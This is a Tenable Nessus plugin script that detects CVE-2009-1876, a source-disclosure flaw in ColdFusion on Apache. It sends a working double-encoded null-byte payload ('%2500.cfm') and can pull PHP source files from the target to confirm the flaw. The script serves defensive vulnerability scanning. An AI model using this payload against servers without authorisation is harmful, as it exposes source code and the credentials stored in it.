#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40667);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-1876");
  script_bugtraq_id(36096);
  script_xref(name:"OSVDB", value:"57189");
  script_xref(name:"Secunia", value:"36329");

  script_name(english:"Adobe ColdFusion On Apache Double Encoded NULL Byte Request File Content Disclosure");
  script_summary(english:"Tries to retrieve script code");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote web server has an information disclosure vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The remote host is running a vulnerable version of ColdFusion on\n",
      "Apache.  When requesting a non-ColdFusion file, appending a\n",
      "double-encoded null byte and an extension handled by ColdFusion (such\n",
      "as '.cfm') will display the contents of that file.  A remote attacker\n",
      "could exploit this to view the source code of other files on the web\n",
      "server (e.g. PHP scripts), which may contain credentials or other\n",
      "sensitive information.\n",
      "\n",
      "This vulnerability is similar to CVE-2006-5858, which affected\n",
      "systems running ColdFusion on IIS.  This vulnerability reportedly\n",
      "only affects systems running ColdFusion on Apache."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.adobe.com/support/security/bulletins/apsb09-12.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Apply the relevant hotfix referenced in the vendor's advisory."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
  );
  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/08/17"
  );
  script_set_attribute(
    attribute:"patch_publication_date",
    value:"2009/08/17"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/08/21"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

banner = get_http_banner(port:port);
if (!banner || 'Apache' >!< banner) exit(0, "The web server isn't Apache.");

doc = string('/', SCRIPT_NAME, '-', unixtime());
url = string(doc, '%2500.cfm');
res = http_send_recv3(method:"GET", item:url, port:port, fetch404:TRUE);
if (isnull(res)) exit(1, "The web server failed to respond.");

# Check for an error message that indicates ColdFusion ignored everything after
# the nulls
if (
  '<head><title>JRun Servlet Error</title>' >< res[2] &&
  doc + '</pre>' >< res[2]
)
{
  # If we're paranoid, try to get the source of a PHP file
  if (report_paranoia >= 2)
  {
    i = 0;
    max_files = 10;
    files = get_kb_list(string("www/", port, "/content/extensions/php"));

    foreach file (files)
    {
       # First try to get the source
       source_url = string(file, '%2500.cfm');
       source = http_send_recv3(method:"GET", item:source_url, port:port);
       if (isnull(source)) exit(1, "The web server failed to respond.");

       # If this doesn't look like PHP, move on to the next file
       if ('<?' >!< source[2]) continue;

       # Now try to get the HTML generated by this page
       html = http_send_recv3(method:"GET", item:file, port:port);
       if (isnull(html)) exit(1, "The web server failed to respond.");

       #If there's a mismatch, the system's vulnerable
       if (source[2] != html[2])
       {
         if (report_verbosity > 0)
         {
           report = string(
             "\n",
             "Nessus requested the following URL :\n\n",
             "  ", build_url(qs:source_url, port:port), "\n"
           );

           if (report_verbosity > 1)
           {
             report += string(
               "\nwhich yielded the following source code :\n\n",
               "  ", source[2], "\n"
             );
           }

           security_warning(port:port, extra:report);
         }
         else security_warning(port);

         exit(0);
       }   

       i++;
       if (i == max_files) break;
    }
  }

  # If we're not paranoid, or if getting PHP source failed, report the vuln
  # based on the error message
  if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "Nessus detected this based on the error message generated by\n",
      "requesting the following URL :\n\n",
      "  ", build_url(qs:url, port:port), "\n"
    );
    security_warning(port:port, extra:report);
    exit(0);
  }
  else security_warning(port);
}
else exit(0, "The host is not affected.");
